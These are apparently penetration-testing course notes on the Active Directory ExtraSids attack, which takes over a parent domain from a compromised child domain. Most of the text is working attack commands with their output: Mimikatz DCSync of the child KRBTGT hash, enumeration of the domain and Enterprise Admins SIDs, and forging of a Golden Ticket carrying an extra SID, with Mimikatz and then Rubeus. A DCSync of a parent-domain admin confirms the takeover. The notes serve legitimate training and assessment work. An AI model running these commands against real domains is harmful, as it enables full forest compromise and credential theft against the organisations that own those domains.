# Attacking Domain Trusts - Child → Parent Trusts - from Windows

## SID History Primer

The [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) attribute exists for **migration scenarios**: when a user migrates from one domain to another, their original SID gets added to the new account's SID history — preserving access to resources in the original domain.

> [!warning] The abuse angle
> SID history is meant to work cross-domain but functions within a single domain too. Using **Mimikatz**, an attacker can inject a SID into the SID History attribute of a controlled account — e.g. a Domain Admin's SID. All SIDs in that attribute get added to the user's **token** at logon, and the token determines resource access. Add a Domain Admin SID → the account can DCSync and forge a **Golden Ticket** (Kerberos TGT), letting the attacker authenticate as any account in the domain for persistence.

## ExtraSids Attack — Mimikatz

Compromises the **parent domain** once a **child domain** is already compromised. Within the same forest, `sidHistory` is honored due to a lack of [SID Filtering](https://web.archive.org/web/20220812183844/https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html) protectio. Set a child-domain user's SID history to the **Enterprise Admins** SID (which only exists in the parent domain) → treated as a member → full forest admin access.

> [!info] The core idea
> Forge a Golden Ticket from the compromised child domain that carries the parent domain's **Enterprise Admins** SID as an "extra SID" — granting parent-domain admin rights without ever actually joining that group.

### Required Data

| Item | Purpose |
|---|---|
| KRBTGT hash for the **child** domain | Signs the forged Golden Ticket |
| SID of the **child** domain | Identifies which domain the ticket originates from |
| A target username in the child domain | **Doesn't need to exist** — used as the ticket's subject |
| FQDN of the child domain | Ticket domain context |
| SID of the **Enterprise Admins** group (root domain) | The "extra SID" granting parent-forest admin rights |

### Step 1 — Get the KRBTGT Hash (DCSync)

```powershell
PS C:\htb>  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt

[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'LOGISTICS\krbtgt' will be the user account
Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
Credentials:
  Hash NTLM: 9d765b482771505cbe97411065964d5f
```

- **KRBTGT** is a special AD account used by the **KDC** to handle Kerberos TGTs.
- Its **NT hash is extremely sensitive** because it can be used to **forge fake TGTs**.
- Forging a fake TGT using the KRBTGT secret is called a **Golden Ticket attack**.
- A forged TGT can potentially let an attacker **impersonate users and access domain resources**.
- To invalidate existing Golden Tickets, the **KRBTGT password must be changed** (typically twice, following Microsoft's recommended procedure).

**For the ExtraSids attack:** the attacker needs the **child domain's KRBTGT secret** to forge a TGT, then places the **parent domain's Enterprise Admin SID as an extra SID** in that forged ticket.

### Step 2 — Get the Child Domain SID(PowerView)

```powershell
PS C:\htb> Get-DomainSID

S-1-5-21-2806153819-209893948-922872689
```

(Also visible directly in the DCSync output above.)

### Step 3 — Get the Enterprise Admins SID (Root Domain)

```powershell
PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

distinguishedname                                       objectsid
-----------------                                       ---------
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
```

Alternative: `Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"` (built-in AD module).

### Data Gathered

- KRBTGT hash (child): `9d765b482771505cbe97411065964d5f`
- Child domain SID: `S-1-5-21-2806153819-209893948-922872689`
- Target user (fake, doesn't need to exist): `hacker`
- Child domain FQDN: `LOGISTICS.INLANEFREIGHT.LOCAL`
- Enterprise Admins SID (root): `S-1-5-21-3842939050-3880317879-2865463114-519`

### Forge the Golden Ticket

```powershell
PS C:\htb> mimikatz.exe
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

User      : hacker
Domain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
SID       : S-1-5-21-2806153819-209893948-922872689
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3842939050-3880317879-2865463114-519 ;
ServiceKey: 9d765b482771505cbe97411065964d5f - rc4_hmac_nt
Lifetime  : 3/28/2022 7:59:50 PM ; 3/25/2032 7:59:50 PM ; 3/25/2032 7:59:50 PM
-> Ticket : ** Pass The Ticket **

Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitted for current session
```

`/ptt` = pass-the-ticket, injects it directly into the current session.

## ExtraSids Attack — Rubeus

Same attack, Rubeus tooling. Confirm no access first (same as above), then:


```
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
ls : Access is denied
```

```powershell
PS C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

[*] Building PAC
```

### Confirm with a DCSync Against the Parent Domain

```powershell
PS C:\Tools\mimikatz\x64> .\mimikatz.exe

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm

[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\lab_adm' will be the user account

  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
```

Successfully DCSync'd a Domain Admin in the **parent** domain — full compromise confirmed.

> [!tip] Specify the domain explicitly when working cross-domain
> ```powershell
> mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
> ```
> Needed when the target domain differs from the current session's domain context.

## Key Takeaways

- [ ] `sidHistory` + no SID Filtering within a forest = the vulnerability that makes this attack possible
- [ ] Five data points needed: child KRBTGT hash, child domain SID, a (possibly fake) target username, child FQDN, root Enterprise Admins SID
- [ ] `lsadump::dcsync /user:<domain>\krbtgt` retrieves the signing hash needed to forge tickets
- [ ] Mimikatz: `kerberos::golden ... /sids:<EA_SID> /ptt` — forges and injects in one command
- [ ] Rubeus: `Rubeus.exe golden /rc4:<hash> /sids:<EA_SID> /ptt` — same result, different tool
- [ ] Confirm before/after with a filesystem access check or a cross-domain DCSync
- [ ] Rotate the KRBTGT password (twice, due to password history) after any assessment reaching full domain compromise
